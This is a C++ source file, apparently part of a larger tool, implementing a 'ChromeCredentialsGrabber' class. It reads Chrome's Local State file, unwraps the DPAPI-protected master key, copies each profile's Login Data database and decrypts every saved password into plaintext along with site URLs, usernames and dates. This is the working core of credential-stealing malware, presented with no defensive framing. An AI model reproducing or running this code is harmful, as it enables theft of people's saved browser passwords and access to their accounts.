#include "ChromeCredentialsGrabber.hpp"

#include "Exception.hpp"
#include "Json.hpp"
#include "Trace.hpp"
#include "Crypto/Aes.hpp"
#include "Crypto/Base64.hpp"
#include "Crypto/Protection.hpp"
#include "Filesystem/File.hpp"
#include "Filesystem/TemporaryFile.hpp"
#include "Sql/InMemorySqliteDatabase.hpp"
#include "Sql/SqliteRowIterator.hpp"
#include "Utils/Buffer.hpp"
#include "Utils/Environment.hpp"
#include "Utils/Strings.hpp"

#include <filesystem>

std::wstring ChromeCredentialsGrabber::source() const
{
	return L"Chrome";
}

static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
{
	static constexpr std::string_view PREFIX = "v10";
	static constexpr size_t GCM_IV_LENGTH = 12;

	if (password.size() < PREFIX.size() + GCM_IV_LENGTH)
	{
		throw Exception(ErrorCode::INVALID_ARGUMENT);
	}

	const Buffer iv = {password.begin() + PREFIX.size(), password.begin() + PREFIX.size() + GCM_IV_LENGTH};
	const Buffer encrypted_password = {
		password.begin() + PREFIX.size() + GCM_IV_LENGTH,
		password.end()
	};

	return {iv, encrypted_password};
}

std::optional<Credentials> ChromeCredentialsGrabber::grab_credentials() const
{
	const std::filesystem::path chrome_root = get_local_chrome_path();
	if (!exists(chrome_root))
	{
		return {};
	}

	const LocalState local_state = LocalState::from_chrome_root(chrome_root);
	const auto aes_key = local_state.get_master_key();

	Credentials credentials;

	for (const std::wstring& profile : local_state.get_user_profiles())
	{
		const auto login_data_db = InMemorySqliteDatabase(
			TemporaryFile(get_login_data_path(chrome_root, profile)).read()
		);

		for (SqliteRowIterator iterator = login_data_db.iterate_query(
			     "SELECT origin_url, username_value, password_value, date_created, date_last_used, date_password_modified FROM logins"
		     );
		     iterator.next();)
		{
			const SqliteRow row = iterator.current();
			const auto [origin_url, username_value, password_value, date_created, date_accessed, date_modified] =
				as_tuple<
					std::wstring, std::wstring, Buffer, int64_t, int64_t, int64_t>(
					row
				);

			if (password_value.empty())
			{
				continue;
			}

			auto [iv, encrypted_password] = parse_password(password_value);

			const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);

			credentials.emplace_back(
				origin_url,
				username_value,
				Strings::to_wstring(Strings::to_string(plaintext_password)),
				convert_datetime(date_created),
				convert_datetime(date_accessed),
				convert_datetime(date_modified)
			);
		}
	}

	return credentials;
}

std::optional<Time::Datetime> ChromeCredentialsGrabber::convert_datetime(const int64_t webkit_datetime)
{
	if (webkit_datetime == 0)
	{
		return {};
	}

	return Time::from_webkit_time(webkit_datetime);
}

std::filesystem::path ChromeCredentialsGrabber::get_local_chrome_path()
{
	return Environment::expand_variables(CHROME_ROOT_FOLDER);
}

std::filesystem::path ChromeCredentialsGrabber::get_user_data_path(const std::filesystem::path& chrome_root)
{
	return chrome_root / "User Data";
}

std::filesystem::path ChromeCredentialsGrabber::get_local_state_path(const std::filesystem::path& chrome_root)
{
	return get_user_data_path(chrome_root) / L"Local State";
}

std::filesystem::path ChromeCredentialsGrabber::get_login_data_path(const std::filesystem::path& chrome_root,
                                                                    const std::wstring& profile)
{
	return get_user_data_path(chrome_root) / profile / L"Login Data";
}

ChromeCredentialsGrabber::LocalState::LocalState(Json local_state):
	m_local_state(std::move(local_state))
{
}

std::vector<std::wstring> ChromeCredentialsGrabber::LocalState::get_user_profiles() const
{
	const Json profiles_order = m_local_state["profile"]["profiles_order"];
	std::vector<std::wstring> result;
	std::ranges::transform(profiles_order, std::back_inserter(result), get_wstring);
	return result;
}

Buffer ChromeCredentialsGrabber::LocalState::get_master_key() const
{
	const Buffer key_with_prefix = Base64::decode(m_local_state["os_crypt"]["encrypted_key"].get<std::string>());
	static constexpr std::string_view PREFIX = "DPAPI";

	const Buffer protected_key = {key_with_prefix.begin() + PREFIX.size(), key_with_prefix.end()};
	return Crypto::unprotect_data(protected_key);
}

ChromeCredentialsGrabber::LocalState ChromeCredentialsGrabber::LocalState::from_chrome_root(
	const std::filesystem::path& chrome_root)
{
	return LocalState(Json::parse(TemporaryFile(get_local_state_path(chrome_root)).read()));
}
